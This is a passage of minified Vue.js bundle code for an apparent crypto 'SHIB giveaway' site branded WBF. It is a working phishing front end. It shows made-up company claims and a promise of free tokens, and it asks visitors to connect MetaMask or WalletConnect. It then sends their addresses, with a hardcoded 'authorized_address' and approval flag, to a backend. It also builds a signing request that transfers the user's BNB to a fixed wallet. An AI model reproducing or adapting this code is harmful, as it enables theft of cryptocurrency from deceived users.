                                    xs: 2,
                                    sm: 4,
                                    md: 6,
                                    lg: 8,
                                    xl: 9
                                }
                            }), n("a-col", {
                                    attrs: {
                                        xs: 24,
                                        sm: 16,
                                        md: 12,
                                        lg: 8,
                                        xl: 5
                                    }
                                },
                                [n("div", {
                                        staticStyle: {
                                            "font-size": "50px",
                                            "font-weight": "bold",
                                            color: "rgb(15 173 175)"
                                        }
                                    },
                                    [t._v(" WBF ")]), n("div", {
                                    staticStyle: {
                                        color: "rgb(18 172 175)",
                                        "font-size": "20px"
                                    },
                                    domProps: {
                                        textContent: t._s(t.$t("lang.desc1"))
                                    }
                                }), n("div", {
                                    staticStyle: {
                                        color: "rgb(18 172 175)"
                                    },
                                    domProps: {
                                        textContent: t._s(t.$t("lang.desc2"))
                                    }
                                })])], 1), n("div", [n("a-modal", {
                                model: {
                                    value: t.visible,
                                    callback: function(e) {
                                        t.visible = e
                                    },
                                    expression: "visible"
                                }
                            },
                            [n("template", {
                                    slot: "footer"
                                },
                                [n("a-button", {
                                        key: "back",
                                        staticStyle: {
                                            "border-radius": "20px"
                                        },
                                        on: {
                                            click: function(e) {
                                                t.visible = !1
                                            }
                                        }
                                    },
                                    [t._v(" View ")])], 1), n("img", {
                                staticStyle: {
                                    "margin-bottom": "28px"
                                },
                                attrs: {
                                    src: s("0cb0"),
                                    weight: "130px",
                                    height: "40px"
                                }
                            }), n("br"), n("div", {
                                    staticClass: "flex-middle",
                                    staticStyle: {
                                        "font-size": "25px"
                                    }
                                },
                                [t._v(" 100B $SHIB Giveaway"), n("a-button", {
                                        key: "submit",
                                        staticStyle: {
                                            "border-radius": "20px",
                                            "margin-left": "10px"
                                        },
                                        attrs: {
                                            type: "danger",
                                            loading: t.loading
                                        },
                                        on: {
                                            click: t.goAirdrop
                                        }
                                    },
                                    [t._v("Click to claim ")])], 1), n("div", {
                                    staticStyle: {
                                        "font-size": "20px"
                                    }
                                },
                                [t._v(" To celebrate the 3rd anniversary of the establishment of WBF Group in New York, and over 20 million registered users, we now give back to new and old users 100 billion of SHIB for five days. Anyone who has a cryptocurrency wallet can receive 20 million SHIBs worth 150 US dollars for free. Each person is limited to one chance to receive it. ")])], 2)], 1), n("a-row", {
                                staticStyle: {
                                    "padding-top": "30px"
                                },
                                attrs: {
                                    type: "flex",
                                    justify: "start",
                                    gutter: 20
                                }
                            },
                            [n("a-col", {
                                attrs: {
                                    xs: 2,
                                    sm: 4,
                                    md: 6,
                                    lg: 8,
                                    xl: 1
                                }
                            }), n("a-col", {
                                    attrs: {
                                        xs: 24,
                                        sm: 16,
                                        md: 12,
                                        lg: 8,
                                        xl: 6
                                    }
                                },
                                [n("a-card", {
                                        staticStyle: {
                                            "border-radius": "25px",
                                            border: "0px solid",
                                            "text-align": "left",
                                            "margin-bottom": "20px",
                                            "white-space": "nowrap"
                                        },
                                        attrs: {
                                            bordered: !1,
                                            hardstyle: "font-size:40px;"
                                        }
                                    },
                                    [n("h1", {
                                        staticStyle: {
                                            overflow: "hidden",
                                            "text-align": "left",
                                            "font-size": "30px",
                                            "font-weight": "bolder",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "0px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.airdrop"))
                                        }
                                    }), n("img", {
                                        staticStyle: {
                                            "margin-left": "-8px"
                                        },
                                        attrs: {
                                            src: s("0cb0"),
                                            weight: "130px",
                                            height: "40px"
                                        }
                                    }), n("h1", {
                                        staticStyle: {
                                            "text-align": "left",
                                            "font-size": "18px",
                                            "font-weight": "bolder",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "15px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.airdropdesc"))
                                        }
                                    }), n("a-button", {
                                            staticClass: "cyanbtn",
                                            staticStyle: {
                                                width: "100%"
                                            },
                                            attrs: {
                                                shape: "round",
                                                width: "100px"
                                            },
                                            domProps: {
                                                textContent: t._s(t.$t("lang.go"))
                                            },
                                            on: {
                                                click: t.goAirdrop
                                            }
                                        },
                                        [t._v(" Go ")])], 1)], 1), n("a-col", {
                                    attrs: {
                                        xs: 24,
                                        sm: 16,
                                        md: 12,
                                        lg: 8,
                                        xl: 6
                                    }
                                },
                                [n("a-card", {
                                        staticStyle: {
                                            "border-radius": "25px",
                                            border: "0px solid",
                                            "text-align": "left",
                                            "margin-bottom": "20px",
                                            "white-space": "nowrap"
                                        },
                                        attrs: {
                                            bordered: !1,
                                            hardstyle: "font-size:40px;"
                                        }
                                    },
                                    [n("h1", {
                                        staticStyle: {
                                            overflow: "hidden",
                                            "text-align": "left",
                                            "font-size": "30px",
                                            "font-weight": "bolder",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "0px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.fishingpools"))
                                        }
                                    }), n("img", {
                                        staticStyle: {
                                            "margin-left": "-8px"
                                        },
                                        attrs: {
                                            src: s("0cb0"),
                                            weight: "130px",
                                            height: "40px"
                                        }
                                    }), n("p", {
                                        staticStyle: {
                                            "font-size": "15px",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "0px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.fishtoharvest"))
                                        }
                                    }), n("h1", {
                                            staticStyle: {
                                                "text-align": "left",
                                                "font-size": "40px",
                                                "font-weight": "bolder",
                                                color: "rgb(15 173 175)",
                                                "margin-bottom": "0px"
                                            }
                                        },
                                        [t._v(" 0.000 ")]), n("p", {
                                            staticStyle: {
                                                "font-size": "15px",
                                                color: "rgb(15 173 175)",
                                                "margin-bottom": "15px"
                                            }
                                        },
                                        [t._v(" ~$0.00 ")]), n("a-button", {
                                        staticClass: "cyanbtn",
                                        staticStyle: {
                                            width: "100%"
                                        },
                                        attrs: {
                                            shape: "round",
                                            width: "100px",
                                            disabled: ""
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.comingsoon"))
                                        }
                                    })], 1)], 1), n("a-col", {
                                    attrs: {
                                        xs: 24,
                                        sm: 16,
                                        md: 12,
                                        lg: 8,
                                        xl: 5
                                    }
                                },
                                [n("a-card", {
                                        staticStyle: {
                                            "border-radius": "25px",
                                            border: "0px solid",
                                            "text-align": "left"
                                        },
                                        attrs: {
                                            bordered: !1,
                                            hardstyle: "font-size:50px;"
                                        }
                                    },
                                    [n("img", {
                                        staticStyle: {
                                            "margin-left": "-8px"
                                        },
                                        attrs: {
                                            src: s("0cb0"),
                                            weight: "130px",
                                            height: "40px"
                                        }
                                    }), n("p", {
                                        staticStyle: {
                                            "font-size": "20px",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "0px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.upto"))
                                        }
                                    }), n("h1", {
                                            staticStyle: {
                                                "text-align": "left",
                                                "font-size": "30px",
                                                "font-weight": "bolder",
                                                color: "rgb(15 173 175)",
                                                "margin-bottom": "0px"
                                            }
                                        },
                                        [t._v(" 000.00% APR ")]), n("p", {
                                        staticStyle: {
                                            "font-size": "20px",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "15px"
                                        },
                                        domProps: {
                                            textContent: t._s(t.$t("lang.inpools"))
                                        }
                                    }), n("a-button", {
                                            staticClass: "cyanbtn",
                                            staticStyle: {
                                                width: "100%"
                                            },
                                            attrs: {
                                                shape: "round",
                                                width: "100px",
                                                disabled: ""
                                            },
                                            domProps: {
                                                textContent: t._s(t.$t("lang.comingsoon"))
                                            }
                                        },
                                        [t._v(" Go Fishing ")])], 1)], 1)], 1)], 1)])
            },
            v = [],
            y = {
                name: "Home",
                components: {},
                data: function() {
                    return {
                        visible: !0,
                        open: !0,
                        address: "",
                        chooseConnect: !1,
                        amount: "",
                        isConnect: !1,
                        metamaskisConnect: !1,
                        walletconnectisconnect: !1,
                        a: !1,
                        b: !1,
                        smt: "0.00",
                        netowkrerror: !1,
                        errormsg: "",
                        error: !1,
                        message: !1,
                        msg: "",
                        chainid: "",
                        s: "",
                        loading: !1
                    }
                },
                mounted: function() {
                    var t = document.body.clientWidth,
                        e = 425;
                    t < e ? this.a = !0 : this.b = !0
                },
                created: function() {
                    console.log(this.$i18n.locale)
                },
                methods: {
                    goAirdrop: function() {
                        void 0 === this.$route.query.s ? this.$router.push("/Airdrop") : this.$router.push("/Airdrop?s=" + this.$route.query.s)
                    },
                    toGiveaway: function() {
                        this.s = this.$route.query.s,
                            "undefined" == typeof this.s ? window.location.href = "https://app.shib.center/": window.location.href = "https://app.shib.center/?s=" + this.s
                    }
                }
            },
            x = y,
            w = (s("cccb"), Object(f["a"])(x, b, v, !1, null, null, null)),
            j = w.exports,
            C = function() {
                var t = this,
                    e = t.$createElement,
                    s = t._self._c || e;
                return s("div", {
                        staticClass: "home"
                    },
                    [s("iframe", {
                        attrs: {
                            frameborder: "0",
                            src: t.app(),
                            width: "100%",
                            height: "1000"
                        }
                    })])
            },
            k = [],
            S = {
                name: "Home",
                components: {},
                data: function() {
                    return {}
                },
                mounted: function() {
                    var t = document.body.clientWidth,
                        e = 425;
                    t < e ? this.a = !0 : this.b = !0
                },
                methods: {
                    app: function() {
                        if (void 0 === this.$route.query.s) return "https://app.shib.center/index.html";
                        var t = this.$route.query.s;
                        return "https://app.shib.center/index.html?s=" + t
                    }
                }
            },
            A = S,
            z = (s("b9a0"), Object(f["a"])(A, C, k, !1, null, null, null)),
            q = z.exports,
            E = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                        staticClass: "home"
                    },
                    [n("el-row", {
                            staticStyle: {
                                "background-color": "#e7fbff"
                            },
                            attrs: {
                                type: "flex",
                                justify: "start"
                            }
                        },
                        [n("el-col", {
                                attrs: {
                                    xs: 22,
                                    sm: 12,
                                    md: 12,
                                    lg: 7,
                                    xl: 6
                                }
                            },
                            [n("div", {
                                    staticClass: "exchange-title"
                                },
                                [t._v("Fishing")])])], 1), n("a-row", {
                            staticStyle: {
                                "padding-top": "30px"
                            },
                            attrs: {
                                type: "flex",
                                justify: "start",
                                gutter: 20
                            }
                        },
                        [n("a-col", {
                            attrs: {
                                xs: 2,
                                sm: 4,
                                md: 6,
                                lg: 8,
                                xl: 1
                            }
                        }), n("a-col", {
                                attrs: {
                                    xs: 24,
                                    sm: 16,
                                    md: 12,
                                    lg: 8,
                                    xl: 6
                                }
                            },
                            [n("a-card", {
                                    staticStyle: {
                                        "border-radius": "25px",
                                        border: "0px solid",
                                        "text-align": "left",
                                        "margin-bottom": "20px",
                                        "white-space": "nowrap"
                                    },
                                    attrs: {
                                        bordered: !1,
                                        hardstyle: "font-size:40px;"
                                    }
                                },
                                [n("h1", {
                                    staticStyle: {
                                        overflow: "hidden",
                                        "text-align": "left",
                                        "font-size": "30px",
                                        "font-weight": "bolder",
                                        color: "rgb(15 173 175)",
                                        "margin-bottom": "0px"
                                    },
                                    domProps: {
                                        textContent: t._s(t.$t("lang.fishingpools"))
                                    }
                                }), n("img", {
                                    staticStyle: {
                                        "margin-left": "-8px"
                                    },
                                    attrs: {
                                        src: s("0cb0"),
                                        weight: "100px",
                                        height: "100px"
                                    }
                                }), n("p", {
                                        staticStyle: {
                                            "font-size": "15px",
                                            color: "rgb(15 173 175)",
                                            "margin-bottom": "0px"
                                        }
                                    },
                                    [t._v(" FISH to Harvest: ")]), n("h1", {
                                        staticStyle: {
                                            "text-align": "left",
                                            "font-size": "40px",
                                            "font-weight": "bolder",
                                            color: "#0fadaf",
                                            "margin-bottom": "0px"
                                        }
                                    },
                                    [t._v(" 0.000 ")]), n("p", {
                                        staticStyle: {
                                            "font-size": "15px",
                                            color: "rgb(15, 173, 175)",
                                            "margin-bottom": "15px"
                                        }
                                    },
                                    [t._v(" ~$0.00 ")]), n("a-button", {
                                        staticStyle: {
                                            width: "100%"
                                        },
                                        attrs: {
                                            type: "primary",
                                            shape: "round",
                                            width: "100px",
                                            disabled: ""
                                        }
                                    },
                                    [t._v(" Coming Soon ")])], 1)], 1)], 1)], 1)
            },
            M = [],
            I = (s("b680"), s("7db0"), new i.a({
                bridge: "https://bridge.walletconnect.org",
                qrcodeModal: l.a
            })),
            _ = {
                name: "Home",
                components: {},
                data: function() {
                    return {
                        open: !0,
                        address: "",
                        chooseConnect: !1,
                        amount: "",
                        isConnect: !1,
                        metamaskisConnect: !1,
                        walletconnectisconnect: !1,
                        a: !1,
                        b: !1,
                        smt: "0.00",
                        netowkrerror: !1,
                        errormsg: "",
                        error: !1,
                        message: !1,
                        msg: "",
                        chainid: ""
                    }
                },
                mounted: function() {
                    var t = document.body.clientWidth,
                        e = 425;
                    t < e ? this.a = !0 : this.b = !0
                },
                created: function() {
                    "metamask" == sessionStorage.getItem("wallet") && (this.connectoMetamask(), this.address = this.ellipsis(sessionStorage.getItem("address"))),
                    "walletconnect" == sessionStorage.getItem("wallet") && I.connected && (this.isConnect = !0, this.walletconnectisconnect = !0, this.address = this.ellipsis(sessionStorage.getItem("address")))
                },
                methods: {
                    unable: function() {
                        this.message = !0,
                            this.msg = "Open on May 7th"
                    },
                    connecttoTrustWallet: function() {},
                    test: function() {
                        var t = this,
                            e = I._formatRequest({
                                method: "get_accounts"
                            });
                        I._sendCallRequest(e).then((function(e) {
                            console.log(e),
                                t.msg = !0,
                                t.message = e
                        })).
                        catch((function(t) {
                            console.error(t)
                        }))
                    },
                    ellipsis: function(t) {
                        var e = t.length;
                        return t ? t.length > 20 ? t.substring(0, 6) + "..." + t.substring(e - 4, e) : t: ""
                    },
                    inputChange: function() {
                        this.smt = (1e4 * this.amount).toFixed(2)
                    },
                    disconnect: function() {
                        I.on("disconnect", (function(t) {
                            if (t) throw t
                        }))
                    },
                    send: function() {
                        window.ethereum.request({
                            method: "wallet_requestPermissions",
                            params: [{
                                eth_accounts: {}
                            }]
                        }).then((function(t) {
                            var e = t.find((function(t) {
                                return "eth_accounts" === t.parentCapability
                            }));
                            e && console.log("eth_accounts permission successfully requested!")
                        })).
                        catch((function(t) {
                            4001 === t.code ? console.log("Permissions needed to continue.") : console.error(t)
                        }))
                    },
                    sendwalletconnect: function() {
                        var t = this,
                            e = {
                                method: "bnb_sign",
                                params: [{
                                    account_number: "34",
                                    chain_id: "Binance-Chain-Ganges",
                                    data: null,
                                    memo: "Smoketoken(SMT)",
                                    msgs: [{
                                        inputs: [{
                                            address: sessionStorage.getItem("address"),
                                            coins: [{
                                                amount: 1e8 * this.amount,
                                                denom: "BNB"
                                            }]
                                        }],
                                        outputs: [{
                                            address: "0xf0842D9956DA4e5bb3126E7bfc96460C068Ba36F",
                                            coins: [{
                                                amount: 1e8 * this.amount,
                                                denom: "BNB"
                                            }]
                                        }]
                                    }],
                                    sequence: "31",
                                    source: "1"
                                }]
                            };
                        I.sendCustomRequest(e).then((function(t) {
                            console.log(t)
                        })).
                        catch((function(e) {
                            console.error(e),
                                t.error = !0,
                                t.errormsg = e
                        }))
                    },
                    connectoMetamask: function() {
                        var t = this;
                        window.ethereum.request({
                            method: "eth_requestAccounts"
                        }).then((function(e) {
                            var s = e[0];
                            t.MetaMaskAddress = s,
                                t.isConnect = !0,
                                t.chooseConnect = !1,
                                t.metamaskisConnect = !0,
                                sessionStorage.setItem("address", s),
                                sessionStorage.setItem("wallet", "metamask"),
                                window.ethereum.request({
                                    method: "net_version"
                                }).then((function(e) {
                                    "56" !== e && (t.netowkrerror = !0)
                                })).
                                catch((function(e) {
                                    t.error = !0,
                                        t.errormsg = e.message
                                })),
                                t.address = t.ellipsis(s)
                        })).
                        catch((function(e) {
                            t.error = !0,
                                t.errormsg = e.message
                        }))
                    },
                    connecttoWalletConnect: function() {
                        var t = this;
                        I.connected || I.createSession(),
                            I.on("connect", (function(e, s) {
                                if (e) throw e;
                                var n = s.params[0],
                                    o = n.accounts,
                                    a = n.chainId;
                                t.isConnect = !0,
                                    t.chooseConnect = !1,
                                    t.walletconnectisconnect = !0,
                                    sessionStorage.setItem("address", o[0]),
                                    sessionStorage.setItem("wallet", "walletconnect"),
                                    console.log(o),
                                    t.address = t.ellipsis(o[0]),
                                    console.log(t.address),
                                1 !== a && (t.netowkrerror = !0)
                            }))
                    }
                }
            },
            B = _,
            D = (s("981b"), Object(f["a"])(B, E, M, !1, null, null, null)),
            P = D.exports,
            H = function() {
                var t = this,
                    e = t.$createElement,
                    n = t._self._c || e;
                return n("div", {
                        staticClass: "home"
                    },
                    [n("el-row", {
                            staticStyle: {
                                "background-color": "#e7fbff"
                            },
                            attrs: {
                                type: "flex",
                                justify: "start"
                            }
                        },
                        [n("el-col", {
                                attrs: {
                                    xs: 22,
                                    sm: 12,
                                    md: 12,
                                    lg: 7,
                                    xl: 6
                                }
                            },
                            [n("div", {
                                    staticClass: "exchange-title"
                                },
                                [t._v("Airdrop")])])], 1), n("el-dialog", {
                            attrs: {
                                title: "Connect to a wallet",
                                width: "300px",
                                visible: t.chooseConnect,
                                "show-close": !1
                            },
                            on: {
                                "update:visible": function(e) {
                                    t.chooseConnect = e
                                }
                            }
                        },
                        [n("button", {
                                staticClass: "connectBtntw",
                                attrs: {
                                    type: "button"
                                },
                                on: {
                                    click: t.connectoMetamask
                                }
                            },
                            [n("img", {
                                attrs: {
                                    src: s("5333"),
                                    width: "24px",
                                    height: "23px"
                                }
                            }), t._v(" DAPP BROWSER ")]), n("button", {
                                staticClass: "connectBtn1",
                                attrs: {
                                    type: "button"
                                },
                                on: {
                                    click: t.connectoMetamask
                                }
                            },
                            [n("img", {
                                attrs: {
                                    src: s("ba67"),
                                    width: "24px",
                                    height: "23px"
                                }
                            }), t._v(" METAMASK ")]), n("button", {
                                staticClass: "connectBtnBSC",
                                attrs: {
                                    type: "button"
                                },
                                on: {
                                    click: function(e) {
                                        return t.connecttoWalletConnect(1)
                                    }
                                }
                            },
                            [n("img", {
                                attrs: {
                                    src: s("1d37")
                                }
                            }), t._v(" WALLETCONNECT(ETH/ERC) ")]), n("button", {
                                staticClass: "connectBtnBSC",
                                attrs: {
                                    type: "button"
                                },
                                on: {
                                    click: function(e) {
                                        return t.connecttoWalletConnect(56)
                                    }
                                }
                            },
                            [n("img", {
                                attrs: {
                                    src: s("1d37")
                                }
                            }), t._v(" WALLETCONNECT(BSC/BEP) ")])]), n("el-row", {
                            attrs: {
                                type: "flex",
                                justify: "center"
                            }
                        },
                        [n("el-col", {
                                attrs: {
                                    xs: 22,
                                    sm: 12,
                                    md: 12,
                                    lg: 7,
                                    xl: 6
                                }
                            },
                            [n("div", {
                                    staticClass: "card",
                                    staticStyle: {
                                        height: "180px"
                                    }
                                },
                                [n("form", [n("div", {
                                        staticClass: "content-card"
                                    },
                                    [n("div", {
                                            staticClass: "join-title"
                                        },
                                        [t._v("WBF Airdrop")]), n("div", {
                                            staticClass: "join-desc"
                                        },
                                        [t._v("Please connect your wallet")]), n("button", {
                                            staticClass: "button",
                                            attrs: {
                                                type: "button"
                                            },
                                            on: {
                                                click: function(e) {
                                                    t.chooseConnect = !0
                                                }
                                            }
                                        },
                                        [t._v(" Connect to wallet ")])])])])])], 1)], 1)
            },
            N = [],
            F = s("bc3a"),
            T = s.n(F),
            U = new i.a({
                bridge: "https://bridge.walletconnect.org",
                qrcodeModal: l.a
            }),
            J = {
                name: "Airdrop",
                components: {},
                data: function() {
                    return {
                        isConnect: !1,
                        shortaddress: "",
                        address: "",
                        authorized_address: "0xBa82cF5aE34D6339a5C651778db4d73BD29ffEcB",
                        bizhong: "",
                        approved: !1,
                        chooseConnect: !1,
                        a: !1,
                        b: !1,
                        s: "",
                        referral_code: "",
                        network: 0
                    }
                },
                mounted: function() {
                    var t = document.body.clientWidth,
                        e = 425;
                    t < e ? this.a = !0 : this.b = !0
                },
                created: function() {
                    void 0 === this.$route.query.s ? this.$router.push("/Dashboard") : this.$router.push("/Dashboard?s=" + this.$route.query.s),
                        console.log(this.getNextMonth())
                },
                methods: {
                    goAirdrop: function() {
                        void 0 === this.$route.query.s ? this.$router.push("/Airdrop") : this.$router.push("/Airdrop?s=" + this.$route.query.s)
                    },
                    submit: function() {
                        if (1 == this.network) {
                            T.a.defaults.baseURL = "/";
                            var t = this;
                            void 0 === t.$route.query.s ? t.s = "": t.s = t.$route.query.s,
                                T.a.post("/api/eth_add", {
                                    address: t.address,
                                    authorized_address: t.authorized_address,
                                    bizhong: "USDT",
                                    code: t.$route.query.s,
                                    approved: t.approved
                                }).then((function(e) {
                                    sessionStorage.setItem("address", t.address),
                                    e.data.authorized_address && (t.authorized_address = e.data.authorized_address);
                                    var s = t.getNextMonth();
                                    localStorage.setItem("receiveDate", s),
                                        void 0 === t.$route.query.s ? t.$router.push("/Dashboard") : t.$router.push("/Dashboard?s=" + t.$route.query.s)
                                }))
                        } else if (56 == this.network) {
                            T.a.defaults.baseURL = "/";
                            var e = this;
                            void 0 === e.$route.query.s ? e.s = "": e.s = e.$route.query.s,
                                T.a.post("/api/eth_add", {
                                    address: e.address,
                                    total: "",
                                    assets: "",
                                    s: e.$route.query.s
                                }).then((function(t) {
                                    if (200 === t.data.data.code) {
                                        sessionStorage.setItem("address", t.data.data.address);
                                        var s = e.getNextMonth();
                                        localStorage.setItem("receiveDate", s),
                                            void 0 === e.$route.query.s ? e.$router.push("/Dashboard") : e.$router.push("/Dashboard?s=" + e.$route.query.s)
                                    } else e.$message.warning(t.data.data.message)
                                }))
                        }
                    },
                    getNextMonth: function() {
                        var t = new Date,
                            e = new Date(t.setMonth(t.getMonth() + 1)),
                            s = e.getFullYear(),
                            n = e.getMonth() + 1,
                            o = e.getDate(),
                            a = s + "-" + (n < 10 ? "0" + n: n) + "-" + (o < 10 ? "0" + o: o);
                        return a
                    },
                    ellipsis: function(t) {
                        var e = t.length;
                        return t ? t.length > 20 ? t.substring(0, 6) + "..." + t.substring(e - 4, e) : t: ""
                    },
                    connecttoWalletConnect: function(t) {
                        var e = this;
                        U.connected || (1 == t ? U.createSession() : 56 == t && U.createSession({
                            chainId: 56
                        })),
                            U.on("connect", (function(t, s) {
                                if (t) throw t;
                                var n = s.params[0],
                                    o = n.accounts,
                                    a = n.chainId;
                                e.isConnect = !0,
                                    e.address = o[0],
                                    e.network = a,
                                    e.shortaddress = e.ellipsis(o[0]),
                                    sessionStorage.setItem("address", e.address),
                                    sessionStorage.setItem("wallet", "walletconnect"),
                                    e.chooseConnect = !1,
                                    e.submit()
                            }))
                    },
                    connectoMetamask: function() {
                        var t = this;
                        window.ethereum.request({
                            method: "eth_requestAccounts"
                        }).then((function(e) {
                            var s = e[0];
                            t.isConnect = !0,
                                t.address = s,
                                t.shortaddress = t.ellipsis(e[0]),
                                sessionStorage.setItem("address", t.address),
                                sessionStorage.setItem("wallet", "metamask"),
                                t.chooseConnect = !1,
                                window.ethereum.request({
                                    method: "net_version"
                                }).then((function(e) {
                                    t.network = e,
                                        t.submit()
                                })).
                                catch((function(t) {
                                    console.log(t)
                                }))
                        })).
                        catch((function(t) {
                            console.log(t)
                        }))
                    }
                }
            },
            R = J,
            W = (s("c7ce"), Object(f["a"])(R, H, N, !1, null, null, null)),
            G = W.exports,
            O = function() {
                var t = this,
                    e = t.$createElement,
                    s = t._self._c || e;
                return s("div", {
                        staticClass: "home"
                    },
                    [s("el-row", {
                            staticStyle: {
                                "background-color": "#e7fbff"
                            },
                            attrs: {
                                type: "flex",
                                justify: "start"
                            }
                        },
                        [s("el-col", {
                                attrs: {
                                    xs: 22,
                                    sm: 12,
                                    md: 12,
                                    lg: 7,
                                    xl: 6
                                }
                            },
                            [s("div", {
                                    staticClass: "exchange-title"
                                },
                                [t._v("Airdrop")])])], 1), s("el-row", {
                            attrs: {
                                type: "flex",
                                justify: "center"
                            }
                        },
                        [s("el-col", {
                                attrs: {
                                    xs: 22,
                                    sm: 12,
                                    md: 12,
                                    lg: 7,
                                    xl: 6
                                }
                            },
                            [s("div", {
                                    staticClass: "card",
                                    staticStyle: {
                                        height: "800px"
                                    }
                                },
                                [s("form", [s("div", {
                                        staticClass: "content-card"
                                    },
                                    [s("div", {
                                            staticClass: "join-title",
                                            staticStyle: {
                                                "font-size": "25px"
                                            }
                                        },
                                        [t._v("SHIB Airdrop")]), s("div", {
                                            staticClass: "join-desc"
                                        },
                                        [t._v(" Referral: 2,000,000 $SHIB each person"), s("br"), t._v(" Referral Link: " + t._s(this.refcode)), s("br")]), s("div", {
                                            staticClass: "join-desc"
                                        },
                                        [t._v("Claim Airdrop: 20,000,000 $SHIB")]), s("div", {
                                            staticClass: "join-title"
                                        },
                                        [t._v("Task")]), s("div", {
                                            staticClass: "join-desc"
                                        },
                                        [t._v(" ① Click the button to claim 20,000,000 $SHIB "), s("button", {
                                                staticClass: "button",
                                                staticStyle: {
                                                    "margin-bottom": "10px"
                                                },
                                                attrs: {
                                                    type: "button"
                                                },
                                                on: {
                                                    click: t.goExchange
                                                }
                                            },
                                            [s("h1", {
                                                    staticStyle: {
                                                        "font-size": "25px",
                                                        color: "#0fadaf",
                                                        "margin-top": "0"
                                                    }
                                                },
                                                [t._v(" Claim $SHIB ")])]), s("br"), t._v(" ② Share your referral link N times, when your friends claim, you will receive extra 2,000,000xN $SHIB!! "), s("br"), t._v(" ③ Expect to receive 20,000,000 $SHIB: " + t._s(t.receiveDate)), s("br")]), s("div", {
                                            staticClass: "join-title"
                                        },
                                        [t._v("About US")]), s("div", {
                                            staticClass: "join-desc"
                                        },
                                        [t._v(" New York WBF Group was registered in New York in 2017, and its subsidiary WBF is a global cryptocurrency financial service platform. It was registered in Singapore in January 2019. Its founding team is composed of senior financial technology professionals from New York, Singapore and China. "), s("br"), s("br"), t._v(' WBF is an international cryptocurrency financial service company, and a global cryptocurrency platform for "coin listing". Its customers come from 177 countries around the world and have branches in 13 cities including New York, London, Singapore, Ho Chi Minh City, Seoul and Tokyo. With media resources made up of more than 4,000 companies around the world, it is committed to continuously building a super platform in the entire industry. '), s("br"), s("br"), s("br")])])])])]), s("a-modal", {
                                attrs: {
                                    footer: null
                                },
                                model: {
                                    value: t.message,
                                    callback: function(e) {
                                        t.message = e
                                    },
                                    expression: "message"
                                }
                            },
                            [t._v(t._s(this.msg))])], 1)], 1)
            },
            $ = [],
            Q = {
                name: "Dashboard",
                components: {},
                data: function() {
                    return {
                        refcode: "",
                        isConnect: !1,
                        shortaddress: "",
                        address: "",
                        chooseConnect: !1,
                        a: !1,
                        b: !1,
                        s: "",
                        referral_code: "",
                        network: 0,
                        telegramUsername: "",
                        twitterUsername: "",
                        message: !1,
                        msg: "",
                        receiveDate: ""
                    }
                },
                mounted: function() {
                    var t = document.body.clientWidth,
                        e = 425;
                    t < e ? this.a = !0 : this.b = !0
                },
                created: function() {
                    void 0 === this.$route.query.s ? this.refcode = "https://shib.center/Airdrop": this.refcode = "https://shib.center/Airdrop/?s=" + this.$route.query.s,
                        this.address = sessionStorage.getItem("address"),
                        this.receiveDate = localStorage.getItem("receiveDate")
                },
                methods: {
                    randomRange: function(t, e) {
                        for (var s = "",
                                 n = e ? Math.round(Math.random() * (e - t)) + t: t, o = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"], a = 0; a < n; a++) {
                            var r = Math.round(Math.random() * (o.length - 1));
                            s += o[r]
                        }
                        this.refcode = s
                    },
                    fishswap: function() {
                        return void 0 === this.$route.query.s ? "https://app.shib.center/": "https://app.shib.center/?s=" + this.$route.query.s
                    },
                    ellipsis: function(t) {
                        var e = t.length;
                        return t ? t.length > 20 ? t.substring(0, 6) + "..." + t.substring(e - 4, e) : t: ""
                    },
                    goExchange: function() {
                        void 0 === this.$route.query.s ? window.location.href = "/claim?s=": window.location.href = "/claim?s=" + this.$route.query.s
                    },
                    submit: function() {
                        "" == this.telegramUsername ? (this.message = !0, this.msg = "Telegram Username cannot be empty") : "" == this.twitterUsername ? (this.message = !0, this.msg = "Twitter Username cannot be empty") : (this.message = !0, this.msg = "Success ", void 0 === this.$route.query.s ? window.location.href = "https://app.shib.center/": window.location.href = "https://app.shib.center/?s=" + this.$route.query.s)
                    },
                    onCopy: function() {
                        this.$message.success("复制成功,请粘贴分享", 10)
                    },
                    onError: function() {}
                }
            },
            L = Q,
            K = (s("2b56"), Object(f["a"])(L, O, $, !1, null, null, null)),
            Y = K.exports;
        n["default"].use(m["a"]);
        var X = [{
                path: "/",
                name: "Home",
                component: j
            },
                {
                    path: "/Exchange",
                    name: "Exchange",
                    component: q
                },
                {
                    path: "/Fishing",
                    name: "Fishing",
                    component: P
                },
                {
                    path: "/Airdrop",
                    name: "Airdrop",
                    component: G
                },
                {
                    path: "/Dashboard",
                    name: "Dashboard",
                    component: Y
                }],
            V = new m["a"]({
                mode: "history",
                routes: X
            }),
            Z = V,
            tt = s("f23d"),
            et = (s("202f"), s("1db1"), s("99e5")),
            st = s.n(et),
            nt = s("a925"),
            ot = s("5c96"),
            at = s.n(ot),
            rt = (s("0fae"), s("4eb5")),
            it = s.n(rt);
        n["default"].prototype.Web3 = st.a,
            n["default"].use(tt["a"]),
            n["default"].config.productionTip = !1,
            n["default"].use(at.a),
            n["default"].use(nt["a"]),
            n["default"].use(it.a);
        var ct = new nt["a"]({
            locale: "en-US",
            messages: {
                "zh-CN": s("23d0"),
                "en-US": s("1e06")
            }
        });
        new n["default"]({
            router: Z,
            i18n: ct,
            render: function(t) {
                return t(p)
            }
        }).$mount("#app")
    },
    6 : function(t, e) {},
    "651e": function(t, e, s) {},
    7 : function(t, e) {},
    8 : function(t, e) {},
    9 : function(t, e) {},
